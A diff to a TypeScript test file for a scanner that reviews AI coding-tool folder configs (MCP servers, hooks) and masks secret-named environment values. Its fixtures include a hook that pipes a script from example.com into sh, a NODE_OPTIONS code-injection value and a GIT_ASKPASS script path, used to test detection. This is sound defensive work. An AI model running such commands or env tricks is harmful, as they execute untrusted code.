@@ -4,7 +4,7 @@ import * as fs from 'fs';
 import * as os from 'os';
 import * as path from 'path';
 import * as vm from 'vm';
-import { acceptedFor, codeLoadingEnv, hasFolderRules, readCodexMcpToml, rootLabels, runsGivenCode, scanFolderSetup, scanFolderSetupCached, shownCommand, shownWord, MAX_FILE_BYTES } from '../src/main/foldersetup';
+import { acceptedFor, codeLoadingEnv, secretEnvName, hasFolderRules, readCodexMcpToml, rootLabels, runsGivenCode, scanFolderSetup, scanFolderSetupCached, shownCommand, shownWord, MAX_FILE_BYTES } from '../src/main/foldersetup';
 import { FolderSetupStore } from '../src/main/foldersetupstore';
 import { costText, decide, explainPrompt, parseExplanation, scanView } from '../src/main/foldersetupipc';
 import type { FolderSetupDeps } from '../src/main/foldersetupipc';
@@ -48,7 +48,7 @@ assert.ok(codexHook && !codexHook.supported && /does not run/.test(codexHook.uns
 assert.strictEqual(by((i) => i.app === 'copilot' && i.kind === 'hook').length, 2, 'Copilot hooks from .github/hooks and .github/copilot/settings.json');
 assert.ok(by((i) => i.label === 'SessionStart hook')[0].detail.includes('curl -s https://example.com/x.sh | sh'), 'the exact command is shown');
 assert.ok(!JSON.stringify(items).includes(SECRET), 'FR-014: no secret value reaches what the window sees');
-assert.ok(by((i) => i.label === 'MCP server github')[0].detail.startsWith('GITHUB_TOKEN=[secret hidden] npx'), 're-review 7537f86: env shown as NAME=value, a token shape masked');
+assert.ok(by((i) => i.label === 'MCP server github')[0].detail.startsWith('GITHUB_TOKEN=[hidden] npx'), 'a secret-looking env NAME hides its value');
 assert.deepStrictEqual(by((i) => i.label === 'MCP server remote')[0].secretNames, ['Authorization'], 'header names only');
 assert.deepStrictEqual(scan.problems, []);
 // digests: stable, and a changed item gets a new id (FR-010)
@@ -228,10 +228,11 @@ assert.ok(folderRuleAllows(['Bash(git:*)'], 'Bash', { command: 'git status' }) &
 // S3: MCP digests hold env and header names only
 {
   const d3 = path.join(tmp, 'digest');
-  const mk = (v: string): string => { fs.mkdirSync(d3, { recursive: true }); fs.writeFileSync(path.join(d3, '.mcp.json'), JSON.stringify({ mcpServers: { s: { command: 'x', env: { API_TOKEN: v } } } })); return scanFolderSetup([d3]).items[0].id; };
+  const mk = (v: string, n = 'API_TOKEN'): string => { fs.mkdirSync(d3, { recursive: true }); fs.writeFileSync(path.join(d3, '.mcp.json'), JSON.stringify({ mcpServers: { s: { command: 'x', env: { [n]: v } } } })); return scanFolderSetup([d3]).items[0].id; };
   const GHT = (c: string): string => 'ghp_' + c.repeat(36);
-  assert.strictEqual(mk(GHT('A')), mk(GHT('B')), 'a changed token-shaped env VALUE keeps the id (no token in the digest)');
-  assert.notStrictEqual(mk('--quiet'), mk('--import=data:text/javascript,1'), 're-review 7537f86: a changed shown env value is a change (asks again)');
+  assert.strictEqual(mk(GHT('A')), mk(GHT('B')), 'a changed env VALUE under a secret name keeps the id (no secret in the digest)');
+  assert.strictEqual(mk(GHT('A'), 'MY_VAR'), mk(GHT('B'), 'MY_VAR'), 'a changed token-shaped value keeps the id (no token in the digest)');
+  assert.notStrictEqual(mk('--quiet', 'FLAGS'), mk('--import=data:text/javascript,1', 'FLAGS'), 're-review 7537f86: a changed shown env value is a change (asks again)');
   fs.writeFileSync(path.join(d3, '.mcp.json'), JSON.stringify({ mcpServers: { s: { command: 'x', env: { OTHER: 'v' } } } }));
   assert.notStrictEqual(scanFolderSetup([d3]).items[0].id, mk('v'), 'a changed env NAME is a change');
 }
@@ -311,10 +312,28 @@ assert.deepStrictEqual(rootLabels(['/x/app', '/y/x/app']), ['x/app (1)', 'x/app 
   for (const [c, a] of [['timeout', ['60', 'node', 'server.js']], ['nice', ['npx', '-y', 'srv']], ['sudo', ['-u', 'mcp', 'uvx', 'srv']]] as const)
     assert.ok(!runsGivenCode(c, a), `${c} ${a.join(' ')}: a wrapped program, not given code`);
   // a token in an env value stays masked and marks the item; a reason keeps the token note
-  const [tk] = mcp({ tk: { command: 'npx', args: ['srv'], env: { GITHUB_TOKEN: 'ghp_' + 'C'.repeat(36) } } });
-  assert.ok(tk.hidden && !tk.hiddenWhy && tk.detail === 'GITHUB_TOKEN=[secret hidden] npx srv' && !JSON.stringify(tk).includes('C'.repeat(36)));
+  const [tk] = mcp({ tk: { command: 'npx', args: ['srv'], env: { MY_VAR: 'ghp_' + 'C'.repeat(36) } } });
+  assert.ok(tk.hidden && !tk.hiddenWhy && tk.detail === 'MY_VAR=[secret hidden] npx srv' && !JSON.stringify(tk).includes('C'.repeat(36)), 'a token shape under a plain name is masked and marks the item');
   const [tk2] = mcp({ tk2: { command: 'npx', args: ['srv'], env: { NODE_OPTIONS: '--require x', K: 'ghp_' + 'C'.repeat(36) } } });
   assert.ok(tk2.hidden && /NODE_OPTIONS/.test(tk2.hiddenWhy ?? '') && /secret key/.test(tk2.hiddenWhy ?? ''));
+  // constitution III: an env value whose NAME looks secret is never shown (nor hashed), and that alone does not untick the item
+  const [pw] = mcp({ pw: { command: 'npx', args: ['-y', 'db-mcp'], env: { DB_PASSWORD: 'hunter2', GITHUB_TOKEN: 'short-not-a-token', PGPASSWORD: 'pg', API_KEY: 'k1', LOG_LEVEL: 'debug' } } });
+  assert.strictEqual(pw.detail, 'DB_PASSWORD=[hidden] GITHUB_TOKEN=[hidden] PGPASSWORD=[hidden] API_KEY=[hidden] LOG_LEVEL=debug npx -y db-mcp', 'secret names hidden, LOG_LEVEL in clear');
+  assert.deepStrictEqual(pw.secretNames, ['DB_PASSWORD', 'GITHUB_TOKEN', 'PGPASSWORD', 'API_KEY'], 'listed as "value hidden"');
+  assert.ok(!pw.hidden && !pw.hiddenWhy, 'hidden by name only: still ticked by default');
+  assert.ok(!JSON.stringify(pw).includes('hunter2') && !JSON.stringify(pw).includes('short-not-a-token'));
+  for (const n of ['SESSION_SECRET', 'PRIVATE_KEY_PATH', 'TLS_CERT', 'COOKIE_JAR', 'AUTH_HEADER', 'MY_CREDENTIALS', 'DB_PWD']) assert.ok(secretEnvName(n), `${n} looks secret`);
+  for (const n of ['LOG_LEVEL', 'API_URL', 'PORT', 'NODE_ENV']) assert.ok(!secretEnvName(n), `${n} is plain`);
+  {
+    const d6 = path.join(tmp, 'pwdigest');
+    fs.mkdirSync(d6, { recursive: true });
+    const mk = (v: string): string => { fs.writeFileSync(path.join(d6, '.mcp.json'), JSON.stringify({ mcpServers: { s: { command: 'x', env: { DB_PASSWORD: v } } } })); return scanFolderSetup([d6]).items[0].id; };
+    assert.strictEqual(mk('hunter2'), mk('hunter3'), 'a secret-named value is not in the digest');
+  }
+  const [gl] = mcp({ gl: { command: 'npx', args: ['srv'], env: { GIT_ASKPASS: '/tmp/x.sh' } } });
+  assert.ok(gl.hidden && /GIT_ASKPASS/.test(gl.hiddenWhy ?? '') && gl.detail.startsWith('GIT_ASKPASS=/tmp/x.sh'), 'a code-loading name: value shown, unticked with the reason');
+  const [sk] = mcp({ sk: { command: 'npx', args: ['srv'], env: { NPM_CONFIG__AUTH: 'x', LOG_LEVEL: 'debug' } } });
+  assert.ok(sk.hidden && /NPM_CONFIG__AUTH/.test(sk.hiddenWhy ?? '') && sk.detail.startsWith('NPM_CONFIG__AUTH=[hidden] LOG_LEVEL=debug'), 'a secret-looking code-loading name: value hidden AND unticked with the reason');
   // nit: quoting
   assert.deepStrictEqual(['-y', 'a b', '', "it's", '$(id)', 'x;y', '@scope/pkg@1.2', '--port=9', 'C:/x'].map(shownWord), ['-y', "'a b'", "''", `'it'\\''s'`, "'$(id)'", "'x;y'", '@scope/pkg@1.2', '--port=9', 'C:/x']);
   // nit: a rule over 500 characters is a problem, not dropped silently
